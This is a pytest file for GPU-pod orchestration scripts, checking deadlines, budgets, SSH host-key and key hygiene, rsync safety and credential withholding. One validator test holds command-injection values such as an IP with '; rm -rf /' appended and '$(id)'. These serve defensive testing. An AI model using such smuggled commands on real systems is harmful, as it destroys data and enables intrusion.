        expected = clock.now + rp.BOOTSTRAP_DEADLINE_S
        assert deadlines == [expected] * len(deadlines)
        assert len(deadlines) == rp.BOOTSTRAP_SSH_STEPS + 1

    def test_a_wedged_step_ends_the_pod_at_the_deadline(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The 90-minute hang, replayed: every step wedges for all it is given."""
        from scripts.phase1b import runpod_parallel as rp

        clock = _FakeClock()
        granted: list[int] = []

        class _R:
            returncode, stdout, stderr = 0, "", ""

        def _run(*args: Any, **kwargs: Any) -> _R:
            granted.append(kwargs["timeout"])
            clock.now += kwargs["timeout"]
            return _R()

        monkeypatch.setattr(rp, "time", clock)
        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        start = clock.now
        with pytest.raises(TimeoutError, match="bootstrap deadline"):
            rp._bootstrap_pod(
                {"ip": "1.2.3.4", "port": 22, "role": "MITRE ATLAS"},
                base_model="BAAI/bge-large-en-v1.5", env={},
            )

        # apt-get took its full 900, the push was clamped to its own 300 wall,
        # the pip step got only the 300 that were left, and the model fetch
        # never started.
        assert granted == [900, 300, 300]
        assert clock.now - start == rp.BOOTSTRAP_DEADLINE_S

    def test_the_deadline_is_far_shorter_than_the_ladder_it_replaces(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        assert rp.BOOTSTRAP_DEADLINE_S == 1500
        # 4 SSH steps x 4 attempts x 900s + 90s of backoff, plus a 2 x 300s
        # push: the wall the timeouts alone permit.
        assert rp._bootstrap_ladder_s() == 15_375
        assert rp._bootstrap_ladder_s() / rp.BOOTSTRAP_DEADLINE_S > 10


class TestBudgetPricesTheBootstrapItActuallyRuns:
    """The gate modelled a bootstrap that does not exist.

    (3 * SSH_DEFAULT_TIMEOUT_S + RSYNC_TIMEOUT_S) / 3600 = 3.50h was wrong on
    three counts: _bootstrap_pod issues FOUR _ssh calls, they run at
    SSH_BOOTSTRAP_TIMEOUT_S rather than the hour-long default, and neither
    SSH_CONNECT_ATTEMPTS nor the rsync attempts appeared at all. It happened to
    land near the true figure by cancelling errors in opposite directions,
    which is the least durable kind of correct.
    """

    def _budget(self, price: float, budget_usd: float, n_pods: int = 5) -> dict:
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "get_gpu_price", return_value=price), \
                patch.object(rp, "BUDGET_USD", budget_usd):
            return rp._check_budget("NVIDIA H100 80GB HBM3", n_pods)

    def test_the_ladder_counts_every_ssh_call_bootstrap_makes(self) -> None:
        """Four, not three. Asserted against the function, not against memory."""
        from scripts.phase1b import runpod_parallel as rp

        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        bootstrap = source.split("def _bootstrap_pod")[1].split("\ndef ")[0]
        assert rp.BOOTSTRAP_SSH_STEPS == bootstrap.count("_ssh(")

    def test_the_ladder_prices_attempts_and_the_bootstrap_ceiling(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        per_ssh = (
            rp.SSH_CONNECT_ATTEMPTS * rp.SSH_BOOTSTRAP_TIMEOUT_S
            + rp.SSH_RETRY_BACKOFF_S * 6
        )
        push = rp.RSYNC_PUSH_ATTEMPTS * rp.RSYNC_PUSH_TIMEOUT_S + rp.SSH_RETRY_BACKOFF_S
        assert rp._bootstrap_ladder_s() == rp.BOOTSTRAP_SSH_STEPS * per_ssh + push

    def test_the_old_model_understated_the_ladder_it_meant_to_bound(self) -> None:
        """The regression itself, so it cannot quietly return."""
        from scripts.phase1b import runpod_parallel as rp

        old = 3 * rp.SSH_DEFAULT_TIMEOUT_S + rp.RSYNC_PULL_TIMEOUT_S
        assert old == 12_600
        assert old < rp._bootstrap_ladder_s()

    def test_the_bootstrap_term_is_the_deadline_the_code_enforces(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        budget = self._budget(price=3.0, budget_usd=1000.0)
        assert budget["bootstrap_hours"] == pytest.approx(
            (rp.BOOTSTRAP_DEADLINE_S + rp.BOOTSTRAP_DEADLINE_SLACK_S) / 3600
        )
        assert budget["bootstrap_ladder_hours"] == pytest.approx(
            rp._bootstrap_ladder_s() / 3600
        )

    def test_the_reachable_hours_are_the_sum_of_the_priced_stages(self) -> None:

        budget = self._budget(price=3.0, budget_usd=1000.0)
        assert budget["reachable_hours"] == pytest.approx(
            budget["bootstrap_hours"] + budget["fold_hours"]
            + budget["collect_hours"]
        )
        assert budget["worst_case_usd"] == pytest.approx(
            budget["fleet_usd_per_hour"] * budget["reachable_hours"]
        )

    def test_the_campaign_budget_admits_the_fleet_it_was_set_for(self) -> None:
        """$7.89/hr/pod is what .pod_state.json recorded for Campaign 2."""
        budget = self._budget(price=7.89, budget_usd=600.0)
        assert budget["worst_case_usd"] < 600.0

    def test_the_most_expensive_permitted_part_admits_at_the_real_budget(
        self,
    ) -> None:
        """The $12/hr filter is the only bound on price, so price the ceiling.

        This asserted against a hardcoded $600 and passed by a $2 margin: at a
        2h FOLD_TIMEOUT_S the ceiling priced to $598. Raising the fold ceiling
        to 4h for the long-context rebaseline pushed it to $718, and the honest
        reading is not that the test was wrong but that these three constants
        are COUPLED -- price ceiling x reachable wall x fleet size must fit the
        budget, so raising one means lowering another or raising the budget.

        It is asserted against the configured BUDGET_USD now, so the coupling
        is checked against the number that actually governs rather than a
        scenario that has drifted from it. The margin is reported in the
        message because a guard that passes by $2 is one constant away from
        being a guard that does not.
        """
        from scripts.phase1b import runpod_parallel as rp

        budget = self._budget(
            price=rp.MAX_USD_PER_HOUR_PER_POD, budget_usd=rp.BUDGET_USD,
        )
        worst = budget["worst_case_usd"]
        assert worst < rp.BUDGET_USD, (
            f"the most expensive permitted part ({rp.MAX_USD_PER_HOUR_PER_POD} "
            f"/hr) over the {budget['reachable_hours']:.1f}h the timeouts "
            f"permit reaches ${worst:.2f}, above the ${rp.BUDGET_USD:.2f} "
            "budget. Lower MAX_USD_PER_HOUR_PER_POD or FOLD_TIMEOUT_S, or "
            "raise TRACT_RUNPOD_BUDGET_USD deliberately."
        )

    def test_the_campaign_price_still_admits_at_the_legacy_600_scenario(
        self,
    ) -> None:
        """The realistic price must stay well inside the tighter old scenario.

        Kept separately from the ceiling test above so that a regression at the
        price we actually pay is distinguishable from one only reachable at the
        filter's absolute limit.
        """
        budget = self._budget(price=7.89, budget_usd=600.0)
        assert budget["worst_case_usd"] < 600.0


class TestAWedgedBootstrapIsAttributedNotPropagated:
    """A pod that runs out of deadline must land as that pod's failure.

    `_clamp_to_deadline` raises TimeoutError, which is an OSError and not a
    RuntimeError. run_folds' bootstrap loop catches Exception, so the wedge is
    recorded against its role and the other pods' futures still report -- but
    that is a property of one word in an except clause, and the whole point of
    the deadline is that the fleet learns which pod died rather than waiting on
    it. Narrowing that clause would abandon the surviving futures instead.
    """

    ROLES = ("MITRE ATLAS", "NIST AI 100-2", "OWASP AI Exchange")

    def test_the_wedged_pod_is_named_and_the_others_still_bootstrap(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22, "pod_id": f"id-{r}"}
                for r in self.ROLES]
        bootstrapped: list[str] = []

        def _bootstrap(pod, base_model=None, env=None, deadline=None):
            if pod["role"] == "NIST AI 100-2":
                raise TimeoutError(
                    "Pod bootstrap deadline exceeded by 3s before 'rsync push' "
                    "could start (budget was 1500s)."
                )
            bootstrapped.append(pod["role"])

        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "_check_deadline", lambda: None)
        monkeypatch.setattr(rpp, "_extend_deadline", lambda: None)
        monkeypatch.setattr(rpp, "fold_roster", lambda split="test": list(self.ROLES))
        monkeypatch.setattr(rpp, "_get_pod_env", lambda: {"HF_TOKEN": "hf_read_only"})
        monkeypatch.setattr(rpp, "_bootstrap_pod", _bootstrap)
        monkeypatch.setattr(
            rpp, "assert_corpus_matches_training_links", lambda: "d" * 64,
        )

        with pytest.raises(RuntimeError, match="NIST AI 100-2"):
            rpp.run_folds("cfg")

        assert sorted(bootstrapped) == ["MITRE ATLAS", "OWASP AI Exchange"]


class TestTheFoldLaunchCannotDoubleStartATrainer:
    """A retried launch used to start a second trainer on the same GPU.

    2026-08-28, arm A3 (Qwen3-0.6B, ~89-minute folds): the launch was given
    SSH_DEFAULT_TIMEOUT_S (3600) and `_ssh` retries on TimeoutExpired, so the
    session hit its one-hour wall and the launch was sent again. `setsid`
    guarantees the first trainer survives, so both trained the same fold on one
    A100 -- confirmed on the pod as pids 1248 and 1720, 6636 MiB and 6576 MiB,
    started exactly sixty minutes apart. The fold could then never finish
    inside FOLD_TIMEOUT_S.

    Invisible until a fold outran the launch timeout. Arm A1's 34-minute folds
    finished first, so A1 passed on speed rather than correctness.
    """

    def test_the_launch_gets_its_own_short_timeout_not_the_work_timeout(self) -> None:
        from scripts.phase1b import runpod_parallel as rp
        import inspect

        src = inspect.getsource(rp._run_fold_on_pod)
        assert "SSH_LAUNCH_TIMEOUT_S" in src, (
            "the fold launch must use its own short wall clock; sharing "
            "SSH_DEFAULT_TIMEOUT_S is what let a retry double-start a trainer"
        )
        assert "timeout=SSH_DEFAULT_TIMEOUT_S" not in src
        assert rp.SSH_LAUNCH_TIMEOUT_S < rp.SSH_DEFAULT_TIMEOUT_S
        # A detach-and-echo that takes a minute is already pathological.
        assert rp.SSH_LAUNCH_TIMEOUT_S <= 300

    def test_the_launch_is_idempotent_under_retry(self) -> None:
        """The command itself must refuse to start a second trainer."""
        from scripts.phase1b import runpod_parallel as rp
        import inspect

        src = inspect.getsource(rp._run_fold_on_pod)
        assert "mkdir" in src, (
            "the launch needs an atomic guard so a retried send cannot start a "
            "second detached trainer"
        )
        assert "already-launched" in src

    def test_the_guard_is_not_a_process_match(self) -> None:
        """pgrep would carry the pattern in the probing shell's own argv.

        Written three times in this repository already. The guard must be a
        filesystem primitive, not a scan of the process table.
        """
        from scripts.phase1b import runpod_parallel as rp
        import inspect

        # Strip comments and docstring prose before matching. The first draft
        # of this test asserted on the raw source and failed on the COMMENT that
        # explains why pgrep is wrong -- a check that cannot tell an
        # explanation from an instance is the same category error it is
        # defending against.
        src = inspect.getsource(rp._run_fold_on_pod)
        code = "\n".join(
            line.split("#", 1)[0] for line in src.splitlines()
        )
        assert "pgrep" not in code, (
            "a pgrep guard matches the shell running the pgrep; use the atomic "
            "mkdir instead"
        )

    def test_a_second_send_of_the_same_command_starts_nothing(self, tmp_path) -> None:
        """Run the real shell logic twice and assert only one launch happens."""
        import subprocess

        remote = tmp_path / "workspace"
        remote.mkdir()
        lock = remote / "fold_TEST.launched"
        marker = remote / "ran.count"
        cmd = (
            f"cd {remote} && "
            f"if mkdir {lock} 2>/dev/null; then "
            f"echo x >> {marker}; echo started; "
            f"else echo already-launched; fi"
        )
        first = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True, check=True)
        second = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True, check=True)

        assert first.stdout.strip() == "started"
        assert second.stdout.strip() == "already-launched"
        assert marker.read_text().count("x") == 1, (
            "the guarded command ran its payload twice; a retried launch would "
            "put two trainers on one GPU"
        )


class TestPhase0PodChannelIsAuthenticated:
    """Phase 0's pod channel authenticated no host and offered every key.

    `StrictHostKeyChecking=no` with `UserKnownHostsFile=/dev/null` is not a weak
    check, it is no check: the endpoints dialled here come from the RunPod API
    and from a `.pod_state.json` that may be hours stale, against a provider
    that recycles IP:port, and the identity offered on that handshake was
    `~/.ssh/id_ed25519` -- the key that opens everything else this account
    reaches. The phase 1B sibling has used accept-new, a repo-local known_hosts
    and a dedicated key since its own review; this pins the same posture here.
    """

    @staticmethod
    def _keyed(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Any:
        """The module with an SSH key that exists, so _require_ssh_key passes."""
        from scripts.phase0 import runpod_orchestrate as rp0

        key = tmp_path / "tract_runpod"
        key.write_text("stub", encoding="utf-8")
        monkeypatch.setattr(rp0, "SSH_KEY", str(key))
        return rp0

    def test_host_keys_are_checked_and_recorded(self) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        opts = list(rp0.SSH_OPTS)
        assert "StrictHostKeyChecking=accept-new" in opts
        assert "StrictHostKeyChecking=no" not in opts
        assert f"UserKnownHostsFile={rp0.KNOWN_HOSTS_FILE}" in opts
        assert "UserKnownHostsFile=/dev/null" not in opts
        assert "IdentitiesOnly=yes" in opts

    def test_the_key_is_dedicated_not_the_operators_identity(self) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        assert "id_ed25519" not in rp0.SSH_KEY
        assert rp0.SSH_KEY.endswith("tract_runpod")
        # The literal, not the word: the comment above the constant names the
        # old default on purpose and must not fail this.
        source = Path(rp0.__file__).read_text(encoding="utf-8")
        assert '"~/.ssh/id_ed25519"' not in source

    def test_a_missing_key_names_the_fix(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """A missing dedicated key must be an error, not a silent fallback."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setattr(rp0, "SSH_KEY", str(tmp_path / "absent"))
        with pytest.raises(FileNotFoundError, match="ssh-keygen"):
            rp0._require_ssh_key()

    def test_a_missing_key_is_found_before_a_fleet_is_bought(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Otherwise the discovery costs four billing H100s."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setattr(rp0, "SSH_KEY", str(tmp_path / "absent"))

        def _boom(**kwargs: Any) -> str:
            raise AssertionError("bought a fleet with no key to reach it")

        monkeypatch.setattr(rp0, "find_fastest_available", _boom)
        with pytest.raises(FileNotFoundError, match="ssh-keygen"):
            rp0.provision()

    def test_a_hostile_endpoint_never_reaches_a_subprocess(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """.pod_state.json is a file on disk and publicIp is a remote string."""
        rp0 = self._keyed(monkeypatch, tmp_path)
        calls: list[Any] = []
        monkeypatch.setattr(
            rp0.subprocess, "run", lambda *a, **k: calls.append(a)
        )
        with pytest.raises(ValueError, match="not an IP address"):
            rp0._ssh("203.0.113.7; rm -rf /", 22, "true")
        with pytest.raises(ValueError, match="not an IP address"):
            rp0._rsync_from("$(id)", 22, "/remote/", "/local/")
        with pytest.raises(ValueError, match="not an IP address"):
            rp0._rsync_to("`id`", 22, "/local/", "/remote/")
        assert calls == []

    def test_provision_discards_last_rounds_host_keys(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Otherwise a recycled IP:port reads as a host-key failure mid-fleet."""
        rp0 = self._keyed(monkeypatch, tmp_path)

        known = tmp_path / ".runpod_known_hosts"
        known.write_text("203.0.113.7 ssh-ed25519 AAAA\n", encoding="utf-8")
        monkeypatch.setattr(rp0, "KNOWN_HOSTS_FILE", known)
        monkeypatch.setattr(
            rp0, "find_fastest_available", lambda min_vram_gb: "GPU"
        )
        monkeypatch.setattr(rp0, "create_pods_parallel", lambda *a, **k: [])
        monkeypatch.setattr(rp0, "_save_pod_state", lambda pods: None)
        rp0.provision()
        assert not known.exists()


class TestPhase0TransfersAreArgvAndSafeLinked:
    """Both directions ran through a shell, and the pull trusted the pod's tree.

    `subprocess.run(cmd, shell=True)` is forbidden outright by CLAUDE.md, and
    here it was handed a string with an API-supplied endpoint and a remote path
    interpolated into it. The pull additionally had no --safe-links, which its
    phase 1B sibling has carried since a review named the attack: a hostile pod
    ships `x -> /home/<op>/.ssh` and the next pass writes through it. The push
    excluded six patterns and none of the sensitive ones.
    """

    @staticmethod
    def _capture(
        monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> tuple[Any, dict[str, Any]]:
        from scripts.phase0 import runpod_orchestrate as rp0

        key = tmp_path / "tract_runpod"
        key.write_text("stub", encoding="utf-8")
        monkeypatch.setattr(rp0, "SSH_KEY", str(key))
        seen: dict[str, Any] = {}

        def _run(cmd: Any, **kwargs: Any) -> None:
            seen["cmd"], seen["kwargs"] = cmd, kwargs

        monkeypatch.setattr(rp0.subprocess, "run", _run)
        return rp0, seen

    def test_the_module_starts_no_shell(self) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        source = Path(rp0.__file__).read_text(encoding="utf-8")
        assert "shell=True" not in source

    def test_the_pull_refuses_a_symlink_out_of_the_destination(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        rp0, seen = self._capture(monkeypatch, tmp_path)
        rp0._rsync_from(
            "203.0.113.7", 22041, "/workspace/tract/results/phase0/", "/local/"
        )
        argv = seen["cmd"]
        assert isinstance(argv, list), "an argv, not a string a shell re-reads"
        assert "--safe-links" in argv
        assert "shell" not in seen["kwargs"]
        assert seen["kwargs"]["timeout"] == rp0.RSYNC_TIMEOUT_S
        assert argv[-2] == "root@203.0.113.7:/workspace/tract/results/phase0/"

    def test_the_push_withholds_the_secrets_and_the_bulk_corpus(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """.pod_state.json holds every pod's live IP and SSH port; .env and
        crosswalk.db are the filesystem route to the same disclosure the
        credential exports were; data/raw is the licensed corpus."""
        rp0, seen = self._capture(monkeypatch, tmp_path)
        rp0._rsync_to("203.0.113.7", 22041, "/local/", "/workspace/tract/")
        argv = seen["cmd"]
        assert isinstance(argv, list)
        for pat in (
            ".env", "*.db", "data/raw", "venv", ".venv", ".claude",
            ".pod_state.json", ".pod_state.json.*", "*.tmp",
            ".runpod_known_hosts",
        ):
            assert f"--exclude={pat}" in argv, f"push still ships {pat}"
        assert "shell" not in seen["kwargs"]

    def test_the_rsync_transport_carries_the_checked_options(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """rsync splits -e itself, so this is the one string left on the path."""
        rp0, seen = self._capture(monkeypatch, tmp_path)
        rp0._rsync_to("203.0.113.7", 22041, "/local/", "/workspace/tract/")
        argv = seen["cmd"]
        transport = argv[argv.index("-e") + 1]
        assert transport.startswith("ssh ")
        assert "StrictHostKeyChecking=accept-new" in transport
        assert transport.endswith("-p 22041")

    def test_ssh_passes_the_script_on_stdin_not_in_argv(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        key = tmp_path / "tract_runpod"
        key.write_text("stub", encoding="utf-8")
        monkeypatch.setattr(rp0, "SSH_KEY", str(key))
        seen: dict[str, Any] = {}

        class _Result:
            returncode = 0
            stdout = ""
            stderr = ""

        def _run(cmd: Any, **kwargs: Any) -> _Result:
            seen["cmd"], seen["kwargs"] = cmd, kwargs
            return _Result()

        monkeypatch.setattr(rp0.subprocess, "run", _run)
        rp0._ssh("203.0.113.7", 22041, "echo hi", env={"X": "1"})
        assert seen["cmd"][0] == "ssh"
        assert seen["cmd"][-3:] == ["root@203.0.113.7", "bash", "-s"]
        assert seen["kwargs"]["input"] == 'export X="1"\necho hi'
        assert seen["kwargs"]["timeout"] == rp0.SSH_TIMEOUT_S
        assert "shell" not in seen["kwargs"]


class TestPhase0PodsCarryNoStandingCredential:
    """Two account-wide keys used to go to all four pods, before every command.

    ANTHROPIC_API_KEY can spend money and WANDB_API_KEY can rewrite the
    experiment record; both were read from `pass` and exported on every pod,
    including pods that fell back to the COMMUNITY tier, over a channel that
    checked no host key. Nine of the ten scheduled commands never call either
    service. The WandB key is gone outright -- phase 0 is finished, `collect`
    brings the JSON back and `run_summary` runs where that key already lives --
    and the Anthropic key, which exp4_hub_descriptions genuinely needs, is gated
    on that command AND on an explicit opt-in.
    """

    PHASE_C = "python -m scripts.phase0.exp4_hub_descriptions --model all --curated"
    PHASE_A = "python -m scripts.phase0.exp3_hierarchy_paths --model bge --curated"

    def test_a_command_that_never_calls_the_api_gets_nothing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Gating per RUN left the key on all four pods for phases A and B."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setenv(rp0.SHIP_ANTHROPIC_KEY_ENV, "1")

        def _boom(name: str) -> str:
            raise AssertionError(f"read `pass {name}` for a local embedding run")

        monkeypatch.setattr(rp0, "_get_credential", _boom)
        pod = {"role": "small-b", "cloud_type": rp0.PRICE_CLOUD_TYPE}
        assert rp0._get_pod_env(pod, self.PHASE_A) == {}

    def test_a_pod_gets_nothing_unless_the_operator_opts_in(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.delenv(rp0.SHIP_ANTHROPIC_KEY_ENV, raising=False)

        def _boom(name: str) -> str:
            raise AssertionError(f"read `pass {name}` with no opt-in")

        monkeypatch.setattr(rp0, "_get_credential", _boom)
        pod = {"role": "small-a", "cloud_type": rp0.PRICE_CLOUD_TYPE}
        assert rp0._get_pod_env(pod, self.PHASE_C) == {}

    def test_the_opt_in_forwards_the_anthropic_key_and_nothing_else(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setenv(rp0.SHIP_ANTHROPIC_KEY_ENV, "1")
        monkeypatch.setattr(rp0, "_get_credential", lambda name: "sk-stub")
        pod = {"role": "small-a", "cloud_type": rp0.PRICE_CLOUD_TYPE}
        assert rp0._get_pod_env(pod, self.PHASE_C) == {
            "ANTHROPIC_API_KEY": "sk-stub"
        }

    def test_the_wandb_key_is_never_read(self) -> None:
        """Tracking runs on the operator's machine after collect, as in 1B."""
        from scripts.phase0 import runpod_orchestrate as rp0

        source = Path(rp0.__file__).read_text(encoding="utf-8")
        assert '"wandb/api-key"' not in source
        assert 'env["WANDB_API_KEY"]' not in source

    def test_an_off_tier_fleet_is_refused_before_the_tree_is_pushed(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """create_pod falls back a tier silently when capacity is short, and
        the tier is a statement about where licensed corpus went."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setenv(rp0.SHIP_ANTHROPIC_KEY_ENV, "1")
        monkeypatch.setattr(rp0, "_load_pod_state", lambda: [
            {"role": "small-a", "ip": "203.0.113.7", "port": 22,
             "cloud_type": rp0.PRICE_CLOUD_TYPE},
            {"role": "small-b", "ip": "203.0.113.8", "port": 22,
             "cloud_type": "COMMUNITY"},
        ])

        def _boom(pod: dict[str, Any]) -> None:
            raise AssertionError("pushed the working tree to a COMMUNITY pod")

        monkeypatch.setattr(rp0, "_bootstrap_pod", _boom)
        with pytest.raises(RuntimeError, match="COMMUNITY"):
            rp0.run_experiments()

    def test_an_unrecorded_tier_is_not_treated_as_the_priced_one(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A pod dict from an older state file carries no cloud_type at all."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setenv(rp0.SHIP_ANTHROPIC_KEY_ENV, "1")
        with pytest.raises(RuntimeError, match="unrecorded"):
            rp0._require_priced_tier([{"role": "small-a"}])

    def test_the_preflight_is_silent_without_the_opt_in(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No credential is going anywhere, so the tier is not this check's
        business -- the push is gated elsewhere or not at all, which residual
        risk names."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.delenv(rp0.SHIP_ANTHROPIC_KEY_ENV, raising=False)
        rp0._require_priced_tier([{"role": "small-a", "cloud_type": "COMMUNITY"}])

    def test_the_per_pod_check_still_backstops_the_preflight(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A last-line assertion that _require_priced_tier ran, not the control."""
        from scripts.phase0 import runpod_orchestrate as rp0

        monkeypatch.setenv(rp0.SHIP_ANTHROPIC_KEY_ENV, "1")
        monkeypatch.setattr(rp0, "_get_credential", lambda name: "sk-stub")
        pod = {"role": "small-a", "cloud_type": "COMMUNITY"}
        with pytest.raises(RuntimeError, match="Refusing to forward"):
            rp0._get_pod_env(pod, self.PHASE_C)


class TestTheRunWindowCanFitAFold:
    """MAX_RUN_HOURS must cover bootstrap plus one fold, or nothing can finish.

    `_check_deadline` ABORTS the run when MAX_RUN_HOURS passes. A window
    smaller than bootstrap + one fold therefore buys a fleet that is guaranteed
    to be torn down mid-fold, with nothing collected and every pod billed for
    the attempt. That is not a budget question -- it is a configuration that
    cannot succeed on any input.

    This became reachable when FOLD_TIMEOUT_S was raised for the long-context
    rebaseline: 0.43h bootstrap + 8.00h fold against the then-current 6h window.
    The failure would have surfaced only after five pods were provisioned.
    """

    # get_gpu_price shells out to `pass` for the API key, which does not exist
    # on a CI runner. The price is irrelevant to a coherence check between two
    # time constants, so it is stubbed rather than fetched.
    def _budget(self, price: float = 3.29, n_pods: int = 5) -> dict:
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "get_gpu_price", return_value=price):
            return rp._check_budget("NVIDIA A100-SXM4-80GB", n_pods)

    def test_the_shipped_constants_are_coherent(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        budget = self._budget()
        needed = budget["bootstrap_hours"] + budget["fold_hours"]
        assert needed <= rp.MAX_RUN_HOURS, (
            f"bootstrap ({budget['bootstrap_hours']:.2f}h) plus one fold "
            f"({budget['fold_hours']:.2f}h) needs {needed:.2f}h but "
            f"MAX_RUN_HOURS is {rp.MAX_RUN_HOURS:.1f}h"
        )

    def test_an_incoherent_window_is_refused_before_provisioning(self) -> None:
        """The guard must fire at _check_budget, not at the first timeout."""
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "MAX_RUN_HOURS", 1.0):
            with pytest.raises(RuntimeError, match="could not finish a single fold"):
                self._budget()


class TestLicensedCorpusStaysOffCommunityHosts:
    """A warning that fires after five pods exist is not a control.

    `_rsync_to` ships the whole working tree -- `data/processed/licensed`
    included -- to whichever host answered, and COMMUNITY is third-party
    operators. On 2026-08-30 four of five folds landed on COMMUNITY and the
    fleet had to be torn down by hand before bootstrap, because the tier check
    ran AFTER provisioning and only logged.

    The restriction is bound to the staged overlay rather than to a flag, so it
    cannot be forgotten on the one run where it matters and does not obstruct a
    public-corpus run where it does not.
    """

    def test_secure_is_required_while_the_overlay_is_staged(self) -> None:
        from scripts.phase1b import runpod_parallel as rp
        from tract.text_selection import merged_corpus_path

        if "licensed" not in merged_corpus_path().parts:
            pytest.skip("licensed overlay is not staged in this checkout")
        assert rp._require_secure_cloud() is True

    def test_the_override_is_explicit_and_logged(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture,
    ) -> None:
        """Shipping licensed text to COMMUNITY must be a recorded decision."""
        from scripts.phase1b import runpod_parallel as rp

        monkeypatch.setenv("TRACT_RUNPOD_ALLOW_COMMUNITY", "1")
        with caplog.at_level("WARNING"):
            assert rp._require_secure_cloud() is False
        assert any("licensing decision" in r.message for r in caplog.records), (
            "the override must say in the log what it permits"
        )

    def test_only_an_exact_1_overrides(
        self, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """"true", "yes" and "0" must not silently disable the restriction."""
        from scripts.phase1b import runpod_parallel as rp
        from tract.text_selection import merged_corpus_path

        if "licensed" not in merged_corpus_path().parts:
            pytest.skip("licensed overlay is not staged in this checkout")
        for value in ("0", "true", "yes", "", " "):
            monkeypatch.setenv("TRACT_RUNPOD_ALLOW_COMMUNITY", value)
            assert rp._require_secure_cloud() is True, (
                f"{value!r} disabled the licensed-corpus restriction"
            )

    def test_create_pod_honours_the_restricted_tier_list(self) -> None:
        """The tier list must reach the API call, not just the signature."""
        import inspect

        from scripts.phase0 import runpod_provision as rpp

        source = inspect.getsource(rpp.create_pod)
        assert "allowed_cloud_types" in source, (
            "create_pod still iterates the module-level preference, so a "
            "restricted list would be accepted and ignored"
        )
        # The list now passes through _effective_cloud_types, which narrows it
        # to SECURE whenever the licensed overlay is staged -- so the caller's
        # list reaches the loop AND cannot widen it. Previously the restriction
        # was applied by one of five callers; it is now applied at the boundary.
        assert "_effective_cloud_types" in source, (
            "create_pod must apply the SECURE restriction itself. Applying it "
            "in the orchestrator left four other call sites unguarded, three "
            "of which rsync PROJECT_ROOT without excluding the licensed corpus."
        )
        parallel = inspect.getsource(rpp.create_pods_parallel)
        assert "allowed_cloud_types=allowed_cloud_types" in parallel, (
            "create_pods_parallel does not forward the restriction to its pods"
        )
